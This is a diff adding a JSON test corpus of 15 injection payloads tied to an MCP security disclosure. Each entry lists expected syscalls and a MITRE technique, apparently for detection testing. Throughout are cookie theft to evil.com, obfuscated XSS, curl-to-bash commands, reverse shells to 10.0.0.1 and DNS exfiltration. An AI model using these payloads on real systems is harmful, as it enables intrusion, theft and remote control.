@@ -1,0 +1,220 @@
+{
+  "metadata": {
+    "generated_at": "2026-04-21T21:26:39.022641",
+    "disclosure": "OX Security April 2026",
+    "total_payloads": 15,
+    "families": [
+      "command_execution",
+      "ui_injection"
+    ]
+  },
+  "payloads": [
+    {
+      "payload_type": "html_injection",
+      "exploit_family": "ui_injection",
+      "raw_payload": "<img src=x onerror=\"fetch('https://evil.com/exfil?c='+document.cookie)\">",
+      "expected_syscalls": [
+        "connect",
+        "sendto",
+        "recvfrom",
+        "socket"
+      ],
+      "severity": "high",
+      "description": "HTML injection via MCP tool response to steal cookies via outbound HTTP request",
+      "mitre_technique": "T1189"
+    },
+    {
+      "payload_type": "markdown_xss",
+      "exploit_family": "ui_injection",
+      "raw_payload": "[Click here](javascript:eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vZXZpbC5jb20vcGF5bG9hZC5qcyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\")))",
+      "expected_syscalls": [
+        "connect",
+        "sendto",
+        "recvfrom"
+      ],
+      "severity": "critical",
+      "description": "Markdown link with javascript: URI containing base64-encoded payload execution",
+      "mitre_technique": "T1059.007"
+    },
+    {
+      "payload_type": "svg_injection",
+      "exploit_family": "ui_injection",
+      "raw_payload": "<svg onload=\"eval(String.fromCharCode(118,97,114,32,115,61,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,59,115,46,101,120,101,99,40,39,98,97,115,104,32,45,99,32,39,43,39,98,97,115,104,32,45,105,32,62,38,32,47,100,101,118,47,116,99,112,47,49,48,46,48,46,48,46,49,47,52,52,52,52,32,48,62,38,49,39))\">",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "clone",
+        "fork"
+      ],
+      "severity": "critical",
+      "description": "SVG with onload event executing obfuscated reverse shell via child_process",
+      "mitre_technique": "T1059.004"
+    },
+    {
+      "payload_type": "css_exfiltration",
+      "exploit_family": "ui_injection",
+      "raw_payload": "<style>@import url(\"https://evil.com/steal.css\");</style><div class=\"secret\">API_KEY=sk-1234567890</div>",
+      "expected_syscalls": [
+        "connect",
+        "sendto",
+        "recvfrom"
+      ],
+      "severity": "high",
+      "description": "CSS import to exfiltrate sensitive data visible in DOM",
+      "mitre_technique": "T1005"
+    },
+    {
+      "payload_type": "iframe_sandbox_escape",
+      "exploit_family": "ui_injection",
+      "raw_payload": "<iframe srcdoc=\"<script>parent.postMessage({type:'execute',cmd:'curl https://evil.com/shell.sh | bash'},'*')</script>\" sandbox=\"allow-scripts allow-same-origin\">",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "clone"
+      ],
+      "severity": "critical",
+      "description": "iframe with srcdoc escaping sandbox to execute commands via postMessage",
+      "mitre_technique": "T1059"
+    },
+    {
+      "payload_type": "shell_metacharacter_injection",
+      "exploit_family": "command_execution",
+      "raw_payload": "; curl https://evil.com/shell.sh | bash #",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "clone",
+        "recvfrom"
+      ],
+      "severity": "critical",
+      "description": "Shell command injection via semicolon to download and execute remote script",
+      "mitre_technique": "T1059.004"
+    },
+    {
+      "payload_type": "command_substitution",
+      "exploit_family": "command_execution",
+      "raw_payload": "$(curl -s https://evil.com/payload.sh | bash)",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "clone"
+      ],
+      "severity": "critical",
+      "description": "Command substitution to execute remote payload inline",
+      "mitre_technique": "T1059.004"
+    },
+    {
+      "payload_type": "backtick_execution",
+      "exploit_family": "command_execution",
+      "raw_payload": "`wget -O- https://evil.com/backdoor.sh | sh`",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "clone"
+      ],
+      "severity": "critical",
+      "description": "Backtick command execution to download and run backdoor",
+      "mitre_technique": "T1059.004"
+    },
+    {
+      "payload_type": "bash_reverse_shell",
+      "exploit_family": "command_execution",
+      "raw_payload": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "clone",
+        "dup",
+        "dup2"
+      ],
+      "severity": "critical",
+      "description": "Bash reverse shell redirecting stdin/stdout/stderr to TCP connection",
+      "mitre_technique": "T1059.004"
+    },
+    {
+      "payload_type": "python_reverse_shell",
+      "exploit_family": "command_execution",
+      "raw_payload": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+      "expected_syscalls": [
+        "execve",
+        "socket",
+        "connect",
+        "dup2",
+        "clone"
+      ],
+      "severity": "critical",
+      "description": "Python reverse shell using socket and subprocess modules",
+      "mitre_technique": "T1059.006"
+    },
+    {
+      "payload_type": "nodejs_reverse_shell",
+      "exploit_family": "command_execution",
+      "raw_payload": "node -e 'require(\"child_process\").spawn(\"/bin/bash\",[\"-c\",\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"])'",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "clone"
+      ],
+      "severity": "critical",
+      "description": "Node.js reverse shell via child_process spawn",
+      "mitre_technique": "T1059.007"
+    },
+    {
+      "payload_type": "pipe_execution",
+      "exploit_family": "command_execution",
+      "raw_payload": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | bash",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "clone",
+        "pipe"
+      ],
+      "severity": "critical",
+      "description": "Pipe-based command execution to run reverse shell",
+      "mitre_technique": "T1059.004"
+    },
+    {
+      "payload_type": "encoded_command_execution",
+      "exploit_family": "command_execution",
+      "raw_payload": "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "clone"
+      ],
+      "severity": "critical",
+      "description": "Base64-encoded reverse shell to evade simple pattern detection",
+      "mitre_technique": "T1140"
+    },
+    {
+      "payload_type": "file_redirection_execution",
+      "exploit_family": "command_execution",
+      "raw_payload": "curl -s https://evil.com/shell.sh > /tmp/.hidden.sh && chmod +x /tmp/.hidden.sh && /tmp/.hidden.sh",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "clone",
+        "openat",
+        "write",
+        "chmod"
+      ],
+      "severity": "critical",
+      "description": "Download, hide, and execute malicious script via file redirection",
+      "mitre_technique": "T1059.004"
+    },
+    {
+      "payload_type": "dns_exfiltration_command",
+      "exploit_family": "command_execution",
+      "raw_payload": "for f in $(ls /etc); do nslookup $f.evil.com; done",
+      "expected_syscalls": [
+        "execve",
+        "connect",
+        "sendto",
+        "recvfrom"
+      ],
+      "severity": "high",
+      "description": "DNS-based data exfiltration by encoding file listings in DNS queries",
+      "mitre_technique": "T1048.001"
+    }
+  ]
+}
